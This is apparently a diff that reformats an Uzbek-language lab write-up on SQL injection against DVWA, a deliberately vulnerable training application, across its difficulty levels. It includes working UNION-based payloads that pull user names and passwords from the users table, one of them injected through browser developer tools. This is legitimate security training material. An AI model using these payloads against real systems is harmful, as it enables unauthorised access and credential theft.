@@ -6,14 +6,15 @@ Kodning zaif qismi:
 ![DVWA SQL Injection](./images/01-dvwa.png)
 
 Bu yerda id to'g'ridan to'g'ri SQL ga qo'shildi.
+
     - Exploit
 SQL injection mavjudligini tekshirish uchun id parametriga sql kodi yuborildi.
 
-                    1' or '1' = '1 UNION SELECT * from password
+    1' or '1' = '1 UNION SELECT * from password
                     
 ![DVWA SQL Injection](./images/02-dvwa.png)
 
-                    ' UNION SELECT user, password FROM users#
+    ' UNION SELECT user, password FROM users#
                     
 ![DVWA SQL Injection](./images/03-dvwa.png)
 
@@ -32,7 +33,7 @@ mysql_real_escape_string() funksiyasi qo'shilgan bo'lsada, foydalanuvchi kiritga
 
 Brauzerning Devtool yordamida 1-value qiymati sql so'roviga o'zgartirildi.
 
-                    or 1=1 UNION SELECT user, password FROM users#
+    or 1=1 UNION SELECT user, password FROM users#
                     
 ![DVWA SQL Injection](./images/05-dvwa.png)
 
@@ -48,10 +49,11 @@ Source code:
 
 ![DVWA SQL Injection](./images/07-dvwa.png)
 
-Exploit
+    - Exploit
+
 Change your ID qismiga sql so'rovi yuborib ko'rildi. 
 
-                    ' UNION SELECT user, password FROM users#
+    ' UNION SELECT user, password FROM users#
                     
 ![DVWA SQL Injection](./images/08-dvwa.png)
 
